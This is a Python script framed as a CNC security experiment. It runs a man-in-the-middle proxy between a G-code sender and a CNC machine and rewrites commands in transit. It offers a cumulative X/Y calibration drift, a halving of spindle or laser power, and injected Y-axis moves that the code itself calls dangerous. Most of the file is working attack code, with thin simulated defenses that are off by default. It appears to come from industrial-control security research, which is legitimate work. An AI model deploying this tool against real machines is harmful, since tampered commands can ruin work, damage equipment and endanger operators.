#!/usr/bin/env python3
"""
Complete CNC Security Experiment Framework
Combines interception, attacks, and data collection
Modified: Y-axis injection, enhanced calibration drift
Save as: complete_experiment.py
Run as: sudo python3 complete_experiment.py
"""

import socket
import threading
import time
import json
import csv
import re
from datetime import datetime
from dataclasses import dataclass, asdict
import os

@dataclass
class ExperimentData:
    timestamp: str
    attack_type: str
    original_command: str
    modified_command: str
    cnc_response: str
    detection_status: str
    impact_metric: float

class CNCSecurityExperiment:
    def __init__(self):
        self.cnc_ip = "192.168.0.170"
        self.cnc_port = 8080
        self.proxy_port = 8888
        self.experiment_data = []
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Attack configurations with ENHANCED values
        self.attacks = {
            'calibration_drift': {
                'enabled': False,
                'drift_rate': 0.5,  # INCREASED from 0.1 to 0.5 for more obvious effect
                'current_drift': 0.0,
                'max_drift': 20.0  # INCREASED from 10.0 for more dramatic effect
            },
            'power_reduction': {
                'enabled': False,
                'reduction_factor': 0.5
            },
            'command_injection': {
                'enabled': False,
                'injection_pattern': 'G1 Y-2 F500'  # CHANGED from Z-0.1 to Y-2
            }
        }
        
        # Defense mechanisms (simulated)
        self.defenses = {
            'anomaly_detection': {
                'enabled': False,
                'threshold': 0.5
            },
            'boundary_check': {
                'enabled': False,
                'x_limits': (0, 100),
                'y_limits': (0, 100),
                'z_limits': (-5, 50)
            }
        }
        
        # Statistics
        self.stats = {
            'total_commands': 0,
            'modified_commands': 0,
            'attacks_detected': 0,
            'attacks_blocked': 0
        }
    
    def run_proxy_experiment(self, duration=60):
        """Run the proxy with attacks enabled"""
        print(f"\n{'='*60}")
        print(f"EXPERIMENT: Proxy Interception with Attacks")
        print(f"Session ID: {self.session_id}")
        print(f"Duration: {duration} seconds")
        print(f"{'='*60}\n")
        
        # Start proxy in thread
        proxy_thread = threading.Thread(
            target=self._proxy_server,
            args=(duration,),
            daemon=True
        )
        proxy_thread.start()
        
        print(f"[+] Proxy started on port {self.proxy_port}")
        print(f"[*] Configure your G-code sender to:")
        print(f"    IP: {self._get_local_ip()}")
        print(f"    Port: {self.proxy_port}")
        print(f"\n[*] Waiting for connections...")
        
        # Wait for duration
        time.sleep(duration)
        
        print(f"\n[*] Experiment complete!")
        self._save_results()
        self._print_statistics()
    
    def _proxy_server(self, duration):
        """Proxy server implementation"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.proxy_port))
        server.listen(5)
        server.settimeout(1.0)  # Allow periodic checks
        
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                client, addr = server.accept()
                print(f"[+] Connection from {addr[0]}:{addr[1]}")
                
                # Handle client in thread
                handler = threading.Thread(
                    target=self._handle_client,
                    args=(client,),
                    daemon=True
                )
                handler.start()
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[!] Server error: {e}")
        
        server.close()
    
    def _handle_client(self, client):
        """Handle client connection with attack injection"""
        cnc = None
        try:
            # Connect to CNC
            cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cnc.connect((self.cnc_ip, self.cnc_port))
            
            # Forward data with modifications
            client_thread = threading.Thread(
                target=self._forward_with_attacks,
                args=(client, cnc),
                daemon=True
            )
            cnc_thread = threading.Thread(
                target=self._forward_responses,
                args=(cnc, client),
                daemon=True
            )
            
            client_thread.start()
            cnc_thread.start()
            
            client_thread.join()
            cnc_thread.join()
            
        except Exception as e:
            print(f"[!] Handler error: {e}")
        finally:
            if client:
                client.close()
            if cnc:
                cnc.close()
    
    def _forward_with_attacks(self, source, dest):
        """Forward data from client to CNC with attack modifications"""
        try:
            while True:
                data = source.recv(4096)
                if not data:
                    break
                
                # Try to decode as G-code
                try:
                    command = data.decode('utf-8', errors='ignore').strip()
                    if command:
                        self.stats['total_commands'] += 1
                        original = command
                        modified = self._apply_attacks(command)
                        
                        # Check defenses
                        detected = self._check_defenses(original, modified)
                        
                        # Log the experiment data
                        self._log_data(original, modified, detected)
                        
                        # Send modified command if not blocked
                        if not detected or not self.defenses['boundary_check']['enabled']:
                            data = (modified + '\n').encode()
                        else:
                            print(f"[BLOCKED] Command blocked by defense")
                            self.stats['attacks_blocked'] += 1
                            
                except:
                    pass  # Binary data
                
                dest.send(data)
                
        except Exception as e:
            if "Connection reset" not in str(e):
                print(f"[!] Forward error: {e}")
    
    def _forward_responses(self, source, dest):
        """Forward responses from CNC to client"""
        try:
            while True:
                data = source.recv(4096)
                if not data:
                    break
                dest.send(data)
        except:
            pass
    
    def _apply_attacks(self, command):
        """Apply enabled attacks to command with enhanced effects"""
        modified = command
        
        # Enhanced Calibration drift attack - MORE OBVIOUS
        if self.attacks['calibration_drift']['enabled']:
            for axis in ['X', 'Y']:
                match = re.search(f'{axis}([\\-\\d.]+)', command)
                if match:
                    original_val = float(match.group(1))
                    # Larger drift for more obvious effect
                    drifted = original_val + self.attacks['calibration_drift']['current_drift']
                    modified = modified.replace(
                        f'{axis}{original_val}',
                        f'{axis}{drifted:.3f}'
                    )
            
            # Increment drift for next command if coordinates were present
            if any(axis in command for axis in ['X', 'Y']):
                self.attacks['calibration_drift']['current_drift'] += self.attacks['calibration_drift']['drift_rate']
                
                # Reset at higher value for more dramatic effect
                if self.attacks['calibration_drift']['current_drift'] > self.attacks['calibration_drift']['max_drift']:
                    print(f"[DRIFT RESET] Drift reached {self.attacks['calibration_drift']['current_drift']:.1f}mm, resetting to 0")
                    self.attacks['calibration_drift']['current_drift'] = 0
        
        # Power reduction attack
        if self.attacks['power_reduction']['enabled']:
            match = re.search(r'S(\d+)', command)
            if match:
                power = int(match.group(1))
                reduced = int(power * self.attacks['power_reduction']['reduction_factor'])
                modified = modified.replace(f'S{power}', f'S{reduced}')
        
        # Command injection - Y-axis instead of Z-axis
        if self.attacks['command_injection']['enabled']:
            # Inject Y-axis movement after movement commands
            if 'G1' in command or 'G0' in command:
                # Add dangerous Y-axis movement
                injection = self.attacks['command_injection']['injection_pattern']
                modified = modified + '; ' + injection
                print(f"[INJECTION] Added: {injection}")
        
        if modified != command:
            self.stats['modified_commands'] += 1
            print(f"[ATTACK] Original: {command}")
            print(f"[ATTACK] Modified: {modified}")
            if self.attacks['calibration_drift']['enabled']:
                print(f"[DRIFT] Current drift: {self.attacks['calibration_drift']['current_drift']:.1f}mm")
        
        return modified
    
    def _check_defenses(self, original, modified):
        """Check if defenses detect the attack"""
        detected = False
        
        # Anomaly detection
        if self.defenses['anomaly_detection']['enabled']:
            if original != modified:
                # Simple detection: any modification is anomalous
                detected = True
                self.stats['attacks_detected'] += 1
                print(f"[DEFENSE] Anomaly detected!")
        
        # Boundary check
        if self.defenses['boundary_check']['enabled']:
            for axis, limits in [
                ('X', self.defenses['boundary_check']['x_limits']),
                ('Y', self.defenses['boundary_check']['y_limits']),
                ('Z', self.defenses['boundary_check']['z_limits'])
            ]:
                match = re.search(f'{axis}([\\-\\d.]+)', modified)
                if match:
                    val = float(match.group(1))
                    if val < limits[0] or val > limits[1]:
                        detected = True
                        print(f"[DEFENSE] Boundary violation: {axis}={val}")
        
        return detected
    
    def _log_data(self, original, modified, detected):
        """Log experiment data"""
        data = ExperimentData(
            timestamp=datetime.now().isoformat(),
            attack_type='multiple' if any(a['enabled'] for a in self.attacks.values()) else 'none',
            original_command=original,
            modified_command=modified,
            cnc_response='ok',  # Simplified
            detection_status='detected' if detected else 'undetected',
            impact_metric=abs(len(modified) - len(original))
        )
        self.experiment_data.append(data)
    
    def _save_results(self):
        """Save experiment results to files"""
        # Save as JSON
        json_file = f"experiment_{self.session_id}.json"
        with open(json_file, 'w') as f:
            json.dump({
                'session_id': self.session_id,
                'config': {
                    'attacks': self.attacks,
                    'defenses': self.defenses
                },
                'statistics': self.stats,
                'data': [asdict(d) for d in self.experiment_data]
            }, f, indent=2)
        
        # Save as CSV
        csv_file = f"experiment_{self.session_id}.csv"
        if self.experiment_data:
            with open(csv_file, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=asdict(self.experiment_data[0]).keys())
                writer.writeheader()
                for data in self.experiment_data:
                    writer.writerow(asdict(data))
        
        print(f"\n[+] Results saved:")
        print(f"    JSON: {json_file}")
        print(f"    CSV: {csv_file}")
    
    def _print_statistics(self):
        """Print experiment statistics"""
        print(f"\n{'='*60}")
        print(f"EXPERIMENT STATISTICS")
        print(f"{'='*60}")
        print(f"Total commands: {self.stats['total_commands']}")
        print(f"Modified commands: {self.stats['modified_commands']}")
        print(f"Attacks detected: {self.stats['attacks_detected']}")
        print(f"Attacks blocked: {self.stats['attacks_blocked']}")
        
        if self.stats['total_commands'] > 0:
            mod_rate = (self.stats['modified_commands'] / self.stats['total_commands']) * 100
            print(f"Modification rate: {mod_rate:.1f}%")
        
        if self.stats['modified_commands'] > 0:
            detect_rate = (self.stats['attacks_detected'] / self.stats['modified_commands']) * 100
            print(f"Detection rate: {detect_rate:.1f}%")
    
    def _get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def run_controlled_experiment(self):
        """Run a controlled experiment with specific scenarios"""
        print("\n" + "="*60)
        print("CONTROLLED EXPERIMENT MODE")
        print("="*60)
        
        scenarios = [
            {
                'name': 'Baseline (No Attacks)',
                'attacks': {},
                'defenses': {},
                'duration': 30
            },
            {
                'name': 'Enhanced Calibration Drift Attack',
                'attacks': {'calibration_drift': {'enabled': True, 'drift_rate': 0.5}},
                'defenses': {},
                'duration': 30
            },
            {
                'name': 'Y-Axis Injection Attack',
                'attacks': {'command_injection': {'enabled': True}},
                'defenses': {},
                'duration': 30
            },
            {
                'name': 'Combined Attacks with Defense',
                'attacks': {
                    'calibration_drift': {'enabled': True, 'drift_rate': 0.5},
                    'command_injection': {'enabled': True}
                },
                'defenses': {'anomaly_detection': {'enabled': True}},
                'duration': 30
            }
        ]
        
        for i, scenario in enumerate(scenarios, 1):
            print(f"\n[{i}/{len(scenarios)}] Running: {scenario['name']}")
            print("-" * 40)
            
            # Reset attack state
            self.attacks['calibration_drift']['current_drift'] = 0
            
            # Configure attacks and defenses
            for attack, config in scenario.get('attacks', {}).items():
                if attack in self.attacks:
                    self.attacks[attack].update(config)
            
            for defense, config in scenario.get('defenses', {}).items():
                if defense in self.defenses:
                    self.defenses[defense].update(config)
            
            # Reset statistics
            self.stats = {k: 0 for k in self.stats}
            self.experiment_data = []
            
            # Run scenario
            self.run_proxy_experiment(duration=scenario['duration'])
            
            # Wait between scenarios
            if i < len(scenarios):
                print("\n[*] Waiting 10 seconds before next scenario...")
                time.sleep(10)
        
        print("\n" + "="*60)
        print("ALL EXPERIMENTS COMPLETE")
        print("="*60)

def main():
    print("="*60)
    print("CNC SECURITY EXPERIMENT FRAMEWORK")
    print("Enhanced with Y-axis injection and obvious drift")
    print("="*60)
    
    experiment = CNCSecurityExperiment()
    
    print("\nExperiment Modes:")
    print("1. Quick Test (1 minute proxy)")
    print("2. Full Attack Test (all attacks enabled)")
    print("3. Defense Test (attacks + defenses)")
    print("4. Controlled Scenarios (multiple tests)")
    print("5. Custom Configuration")
    print("6. Enhanced Drift Only (very obvious)")
    
    choice = input("\nSelect mode [1]: ").strip() or "1"
    
    if choice == "1":
        experiment.run_proxy_experiment(60)
    
    elif choice == "2":
        print("\n[*] Enabling all attacks with enhanced settings...")
        experiment.attacks['calibration_drift']['enabled'] = True
        experiment.attacks['calibration_drift']['drift_rate'] = 0.5
        experiment.attacks['power_reduction']['enabled'] = True
        experiment.attacks['command_injection']['enabled'] = True
        experiment.run_proxy_experiment(120)
    
    elif choice == "3":
        print("\n[*] Enabling attacks and defenses...")
        experiment.attacks['calibration_drift']['enabled'] = True
        experiment.attacks['calibration_drift']['drift_rate'] = 0.5
        experiment.defenses['anomaly_detection']['enabled'] = True
        experiment.defenses['boundary_check']['enabled'] = True
        experiment.run_proxy_experiment(120)
    
    elif choice == "4":
        experiment.run_controlled_experiment()
    
    elif choice == "5":
        print("\n[*] Custom configuration:")
        
        # Configure attacks
        if input("Enable calibration drift? (y/n): ").lower() == 'y':
            experiment.attacks['calibration_drift']['enabled'] = True
            rate = input("Drift rate [0.5]: ").strip() or "0.5"
            experiment.attacks['calibration_drift']['drift_rate'] = float(rate)
            max_drift = input("Max drift before reset [20]: ").strip() or "20"
            experiment.attacks['calibration_drift']['max_drift'] = float(max_drift)
        
        if input("Enable power reduction? (y/n): ").lower() == 'y':
            experiment.attacks['power_reduction']['enabled'] = True
            factor = input("Reduction factor [0.5]: ").strip() or "0.5"
            experiment.attacks['power_reduction']['reduction_factor'] = float(factor)
        
        if input("Enable Y-axis injection? (y/n): ").lower() == 'y':
            experiment.attacks['command_injection']['enabled'] = True
            pattern = input("Injection pattern [G1 Y-2 F500]: ").strip() or "G1 Y-2 F500"
            experiment.attacks['command_injection']['injection_pattern'] = pattern
        
        # Configure defenses
        if input("Enable anomaly detection? (y/n): ").lower() == 'y':
            experiment.defenses['anomaly_detection']['enabled'] = True
        
        if input("Enable boundary checking? (y/n): ").lower() == 'y':
            experiment.defenses['boundary_check']['enabled'] = True
        
        duration = int(input("Duration in seconds [60]: ").strip() or "60")
        experiment.run_proxy_experiment(duration)
    
    elif choice == "6":
        print("\n[*] Enhanced Drift Only Mode - VERY OBVIOUS")
        experiment.attacks['calibration_drift']['enabled'] = True
        experiment.attacks['calibration_drift']['drift_rate'] = 1.0  # Very aggressive
        experiment.attacks['calibration_drift']['max_drift'] = 30.0  # Large maximum
        print(f"[*] Drift rate: 1.0mm per command")
        print(f"[*] Will accumulate up to 30mm before reset")
        experiment.run_proxy_experiment(120)

if __name__ == "__main__":
    main()
